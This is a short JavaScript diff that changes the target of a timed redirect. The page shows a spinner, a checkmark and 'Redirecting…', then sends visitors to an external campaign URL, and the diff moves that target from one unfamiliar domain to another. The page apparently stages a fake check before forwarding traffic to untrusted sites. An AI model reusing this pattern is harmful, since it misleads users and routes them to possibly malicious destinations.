@@ -299,7 +299,7 @@
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'http://h2n6.com/?utm_campaign=sOGcfWKDHx&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
+        setTimeout(() => { window.location.href = 'https://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
